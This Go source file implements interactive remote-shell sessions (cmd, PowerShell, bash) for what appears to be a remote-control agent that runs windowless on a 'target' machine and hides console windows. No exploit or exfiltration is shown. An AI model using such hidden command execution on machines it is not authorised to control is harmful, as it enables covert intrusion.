package commands

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ishellCollectMs is how long the agent waits for output after writing input.
const ishellCollectMs = 200 * time.Millisecond

// ishellSession holds an interactive shell session on the target.
// mode "process" keeps a persistent process (powershell/bash/sh) with stdin/stdout
// pipes; mode "cmd-session" runs each cmd.exe command as a fresh parameter
// invocation while manually tracking the working directory — this avoids the
// Windows limitation where cmd.exe mangles Chinese input on its stdin pipe.
type ishellSession struct {
	mode   string // "process" | "cmd-session"
	active bool

	// process mode
	cmd   *exec.Cmd
	stdin io.WriteCloser
	out   *lockedBuffer
	gbk   bool // stdin/stdout use CP936 (legacy cmd process mode)

	// cmd-session mode
	cwd string
}

// lockedBuffer is a concurrency-safe growable buffer for capturing shell output.
type lockedBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *lockedBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *lockedBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return decodeToUTF8(b.buf.Bytes())
}

func (b *lockedBuffer) Drain() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	s := decodeToUTF8(b.buf.Bytes())
	b.buf.Reset()
	return s
}

// execIshellOpen starts a persistent shell (e.g. powershell / cmd / bash).
// cmd.exe is the default on Windows (run in cmd-session mode so non-ASCII input
// survives via command-line parameters); bash is the default elsewhere.
func (d *Dispatcher) execIshellOpen(argsJSON string) string {
	var args struct {
		Shell string `json:"shell"`
	}
	_ = json.Unmarshal([]byte(argsJSON), &args)
	shell := strings.TrimSpace(args.Shell)
	if shell == "" {
		if runtime.GOOS == "windows" {
			shell = "cmd"
		} else {
			shell = "bash"
		}
	}

	d.closeIshell()

	name := shell
	switch strings.ToLower(shell) {
	case "cmd":
		name = "cmd.exe"
	case "powershell", "pwsh", "ps":
		if runtime.GOOS == "windows" {
			name = "powershell.exe"
		} else {
			name = "pwsh"
		}
	case "bash":
		name = "bash"
	case "sh":
		name = "sh"
	}

	cmd := exec.Command(name)
	// CREATE_NO_WINDOW keeps powershell.exe/pwsh from flashing a black console:
	// the agent runs windowless (GUI subsystem), so children would otherwise
	// open a new console window on every interactive session.
	cmd.SysProcAttr = noWindowAttr()
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return "error: stdin pipe: " + err.Error()
	}
	out := &lockedBuffer{}
	cmd.Stdout = out
	cmd.Stderr = out

	// Windows cmd: use "cmd-session" mode (per-command parameter execution with
	// a tracked cwd). cmd.exe's stdin pipe corrupts non-ASCII input (a Windows
	// limitation), while command-line parameters carry Unicode correctly.
	if runtime.GOOS == "windows" && strings.EqualFold(shell, "cmd") {
		cwd, _ := os.Getwd()
		d.ishell = &ishellSession{mode: "cmd-session", active: true, cwd: cwd}
		return "interactive shell started: cmd (session mode)"
	}

	if err := cmd.Start(); err != nil {
		return "error: start " + name + ": " + err.Error()
	}
	go cmd.Wait()

	d.ishell = &ishellSession{cmd: cmd, stdin: stdin, out: out, active: true}

	// Let the shell print its banner/prompt
	time.Sleep(ishellCollectMs)
	return "interactive shell started: " + name + "\n" + strings.TrimSpace(stripANSI(out.String()))
}

// execIshellRun writes input to the open shell and returns collected output.
func (d *Dispatcher) execIshellRun(argsJSON string) string {
	var args struct {
		Input string `json:"input"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return "error: invalid args"
	}
	if d.ishell == nil || !d.ishell.active {
		return "error: no interactive shell open (use ishell <cmd|powershell|bash>)"
	}

	if d.ishell.mode == "cmd-session" {
		return d.runCmdSession(args.Input)
	}

	input := args.Input
	if d.ishell.gbk {
		input = string(encodeToConsole(input))
	}
	if _, err := io.WriteString(d.ishell.stdin, input+"\n"); err != nil {
		return "error: write input: " + err.Error()
	}
	time.Sleep(ishellCollectMs)
	return strings.TrimRight(stripANSI(d.ishell.out.Drain()), "\r\n")
}

// runCmdSession executes one command in cmd-session mode. `cd` is handled
// locally so the session keeps its working directory across commands.
func (d *Dispatcher) runCmdSession(input string) string {
	trimmed := strings.TrimSpace(input)
	lower := strings.ToLower(trimmed)

	if lower == "cd" {
		if d.ishell.cwd != "" {
			return d.ishell.cwd
		}
		return ""
	}
	if strings.HasPrefix(lower, "cd ") {
		dir := strings.TrimSpace(trimmed[3:])
		target := dir
		if !filepath.IsAbs(target) && d.ishell.cwd != "" {
			target = filepath.Join(d.ishell.cwd, dir)
		}
		if info, err := os.Stat(target); err == nil && info.IsDir() {
			d.ishell.cwd = target
			return target
		}
		return "error: cannot cd to " + dir
	}

	// Run the command in the session's working directory via Cmd.Dir (Go passes
	// the command as a Unicode parameter, so Chinese input/output is correct).
	// CREATE_NO_WINDOW suppresses the console flash from windowless agents.
	c := exec.Command("cmd.exe", "/c", input)
	c.SysProcAttr = noWindowAttr()
	if d.ishell.cwd != "" {
		c.Dir = d.ishell.cwd
	}
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(stripANSI(decodeToUTF8(out)))
	if err != nil && result == "" {
		result = err.Error()
	}
	return result
}

// execIshellClose terminates the open interactive shell.
func (d *Dispatcher) execIshellClose() string {
	if d.ishell == nil || !d.ishell.active {
		return "no interactive shell open"
	}
	d.closeIshell()
	return "interactive shell closed"
}

// parseCodePage extracts the active console code page from `chcp` output like
// "Active code page: 65001" (or its localized form).
func parseCodePage(s string) int {
	for _, line := range strings.Split(s, "\n") {
		line = strings.TrimSpace(line)
		if i := strings.LastIndex(line, ":"); i >= 0 {
			num := strings.TrimSpace(line[i+1:])
			if n, err := strconv.Atoi(num); err == nil && n > 0 {
				return n
			}
		}
	}
	return 0
}

func (d *Dispatcher) closeIshell() {
	if d.ishell == nil {
		return
	}
	d.ishell.active = false
	if d.ishell.cmd != nil && d.ishell.cmd.Process != nil {
		_ = d.ishell.cmd.Process.Kill()
	}
	if d.ishell.stdin != nil {
		_ = d.ishell.stdin.Close()
	}
	d.ishell = nil
}
